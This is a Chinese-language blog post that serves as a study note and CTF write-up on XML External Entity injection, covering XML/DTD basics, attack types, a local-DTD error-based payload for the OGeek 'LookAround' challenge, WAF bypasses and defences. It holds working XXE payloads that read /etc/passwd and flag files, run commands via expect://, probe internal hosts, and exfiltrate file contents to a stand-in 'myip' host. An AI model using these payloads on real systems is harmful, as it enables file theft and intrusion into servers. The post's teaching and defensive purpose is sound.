---
title: XML外部实体注入漏洞与利用学习
tags:
  - XXE
  - Writeup
  - CTF
  - Summary
date: 2019-08-31 00:37:43
---


![](/assets/images/move/2019-08-31-09-12-49.png)


## 什么是XXE

XML外部实体注入(**X**ML E**x**ternal **E**ntity Injection)，即攻击者通过干扰应用程序对XML数据的处理，从而实现读取应用程序服务器文件系统中的文件，并与应用程序本身可以访问到的任何后端或外部系统进行交互的一种Web安全漏洞。

在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题。

在某些情况下，攻击者可以通过利用XXE漏洞执行[**服务端请求伪造攻击**(server-side request forgery)](https://3nd.xyz/2019/08/22/ssrf-learning-note/)来升级XXE攻击以危及底层服务器或者其他后端基础架构。

- XML基础

`XML`(extensible markup language)是用于标记电子文件使其具有结构性的**可拓展标记语言**，用于存储和传输数据。与HTML一样，XML使用标签和树形结构。与HTML不同，XML不使用预定义标记，因此可以标记指定描述数据的名称。

XML文档结构包括XML声明、`DTD`文档类型定义（可选）、文档元素。


```xml
<?xml version="1.0" ?> <!-- xml声明 -->
<!DOCTYPE note [ <!-- DTD文档类型定义 根元素note -->
  <!ELEMENT note (to, from, heading, body)> <!--note中的子元素-->
  <!ELEMENT to (#PCDATA)> <!-- 接收者 -->
  <!ELEMENT from (#PCDATA)> <!-- 发送者 -->
  <!ELEMENT heading (#PCDATA)> <!-- 标题 -->
  <!ELEMENT body (#PCDATA)> <!-- 消息主题 -->
]>
<note> <!--文档元素-->
    <to>Jerry</to>
    <from>Tom</from>
    <heading>Reminder</heading>
    <body>Don't forget the meeting!</body>
</note>
```

- 文档类型定义

XML文档类型定义（DTD）包含可以定义XML文档结构，它可以包含的数据值类型以及其他项的声明。 DTD在XML文档开头的可选`DOCTYPE`元素中声明。 DTD可以完全独立于文档本身（称为“内部DTD”），也可以从其他地方加载（称为“外部DTD”），也可以是两者的混合。

```xml
<!-- 内部声明 -->
<!DOCTYPE 根元素 [元素声明]>
<!-- 引用外部DTD -->
<!DOCTYPE 根元素 SYSTEM "文件名">
```

- XML Entity

XML实体是在XML文档中表示数据项的一种方法，而不是使用数据本身，可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。

```xml
<!--内部声明实体-->
<!ENTITY 实体名称 "实体的值">
<!--引用外部实体-->
<!ENTITY 实体名称 SYSTEM "URI">
```
XML外部实体是一种自定义实体，其定义位于声明它们的DTD之外。

外部实体的声明使用SYSTEM关键字，并且必须指定应从中加载实体值的URL。 例如：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

URL可以使用`file://`协议，因此可以从文件加载外部实体。例如:

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

实体又分为参数实体与一般实体：

- 一般实体指代的是将来XML数据文档要用到的文本或数据。

```xml
<!--声明语法-->
<!ENTITY 实体名 "实体内容">
<!--引用方式-->
&实体名;
```
- 参数实体的作用是作为DTD中的元素的条件控制。

参数实体必须定义在**单独的DTD文档**中或XML文档的DTD区(但是**引用**只能在单独的DTD文档中，即**外部子集**，而不能在XML文档的DTD区->内部子集)。

```xml
<!--XML解析器都不会解析同级参数实体的内容-->
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % files SYSTEM "file:///etc/passwd">  
    <!ENTITY % send SYSTEM "http://myip/?a=%files;"> 
    %send;
]>
```

参数实体引用(Parameter Entity Reference)，禁止在内部DTD中引用参数实体。
```xml
<!--嵌套 PEReferences forbidden in internal subset in Entity PEReferences -->
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % file SYSTEM "file:///etc/passwd">  
    <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
    %start;
    %send;
]>
```

=> 引用外部的DTD

```xml
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip:10001/?%file;'>">
%start;
```

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "http://myip/xml.dtd">  
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
    %remote;
    %send;
]>
<message>1234</message>
```

![](/assets/images/move/2019-08-31-11-02-11.png)


> External DTD allows us to include one entity inside the second, but it is prohibited in the internal DTD.



## XXE是如何产生的

当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。引入外部实体方式有多种，比如：

- 内部声明实体

```xml
<?xml version="1.0"?>
<!DOCTYPE a[
  <!ENTITY b SYSTEM "file:///etc/passwd">
]>
<c>&b;</c>
```

- 外部引用DTD

evil.dtd:

```xml
<!ENTITY b SYSTEM "file:///etc/passwd">
```


方式1：

```xml
<?xml version="1.0"?>
<!DOCTYPE a SYSTEM "http://normal-website.com/evil.dtd">
<c>&b;</c>
```

方式2:

```xml
<?xml version="1.0"?>
<!DOCTYPE a[
  <!ENTITY % d SYSTEM "http://normal-website.com/evil.dtd">
  %d;
]>
<c>&b;</c>
```

另外不同应用程序支持的协议不同:

![](/assets/images/move/2019-08-31-10-32-27.png)

上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有:

![](/assets/images/move/2019-08-31-10-34-54.png)


## XXE攻击方式

- 读取任意文件

```xml
<?xml verison="1.0"?>
<!DOCTYPE ANY[
  <!ENTITY xxe SYSTEM "file://etc/passwd">
]>
<x>&xxe;</x>
```



- 执行系统命令

```xml
<!--装有expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。-->
<?xml verison="1.0"?>
<!DOCTYPE ANY[
  <!ENTITY xxe SYSTEM "expect://id">
]>
<x>&xxe;</x>
```

- 探测内网端口

```xml
<?xml verison="1.0"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "http://192.168.0.1:80/"> 
]>
<x>&xxe;</x>
```

- 攻击内网网站

```xml
<!--攻击内网struts2网站，远程执行系统命令-->
<?xml verison="1.0"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "http://192.168.1.122:8080/struct2-blank/example/Helloworld.action?redirect:...payload.."> 
]>
<x>&xxe;</x>
```

## 利用本地DTD执行XXE

想象一下我们有一个XXE利用点，支持外部实体，但服务器的响应始终为空。 在这种情况下，我们有两种选择：基于错误(`error-based`)和带外(`out-of-band`)利用。

- Error Based

![](/assets/images/move/2019-08-31-11-49-37.png)


这里我们可以看见此利用方式正在使用外部服务器进行有效负载传递。 如果我们和目标服务器之间有防火墙，我们可以做什么？上面的利用方式将会失效。

如果我们只将外部DTD内容直接放入DOCTYPE怎么办？ 总会出现一些错误：

![](/assets/images/move/2019-08-31-11-53-15.png)

外部的DTD允许我们在一个实体中包含引用另外一个实体，但是在内部DTD子集中这种行为是被禁止的。

而由于防火墙的存在，我们又无法远程引用自定义的DTD文档类型说明进行利用，这时我们就把目光放到了服务器本地所存在的DTD文件。

我们可以对本地的DTD文件做些什么呢？要在内部DTD子集中使用外部DTD语法，我们可以在目标主机上强制执行本地dtd文件，并在其中重新定义一些参数实体引用：

![](/assets/images/move/2019-08-31-12-01-03.png)

这种方式起作用是因为所有XML实体都是常量，如果定义两个具有相同名称的实体，则仅使用第一个实体。

- **OGeek CTF Web LookAround**

![](/assets/images/move/2019-08-25-22-07-44.png)

F12查看网页源代码，在`./js/xxx.js`中存在以下关键代码：

```js
var data = "<?xml version=\"1.0\" ?>\n<request>\n    <status>1</status>\n</request>";

setInterval(function(){
    $.post("callback", data);
}, 10000);
```

经fuzz发现无法无法访问包含远程服务器dtd文件，xml正常解析无回显~ 至此就确定了远程包含DTD、带外传输数据都是失效的，这时我们可以尝试利用基于错误的本地dtd包含利用。


/usr/share/xml/fontconfig/fonts.dtd:

```xml
<!ENTITY % expr 'int|double|string|matrix|bool|charset|langset
      |name|const
      |or|and|eq|not_eq|less|less_eq|more|more_eq|contains|not_contains
      |plus|minus|times|divide|not|if|floor|ceil|round|trunc'>
[...]
<!ELEMENT test (%expr;)*>
```

Payload:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///flag">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>any text</message>
```

![](/assets/images/move/2019-08-25-22-11-57.png)

## 一些绕过技巧

- 利用**php://filter**规避字符混乱

php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。

```php
php://filter/read=convert.base64-encode/resource=./xxe.php
```

> [谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

- 文档中的额外空格

由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在<?xml?>或<!DOCTYPE>中插入额外的空格，从而绕过此类WAF。

![](/assets/images/move/2019-08-31-12-36-45.png)

- 外来编码(Exotic encodings)

一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。
在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。

> [绕过WAF保护的XXE](https://xz.aliyun.com/t/4059)

## 如何防御XXE

- 使用开发语言提供的禁用外部实体的方法

实际上，所有XXE漏洞会出现的原因是应用程序的XML解析库支持应用程序不需要或不打算使用的潜在危险的XML功能。防止XXE攻击的最简单，最有效的方法是禁用这些功能。

```php
libxml_disable_entity_loader(true);
```

> [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

- 过滤用户提交的XML数据

```xml
Keyword: SYSTEM PUBLIC ...
```


## 参考

- [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

- [Blind XXE详解与Google CTF一道题分析](https://www.freebuf.com/vuls/207639.html)

- [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)

- [未知攻焉知防——XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)

- [AUTOMATING LOCAL DTD DISCOVERY FOR XXE EXPLOITATION](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation)








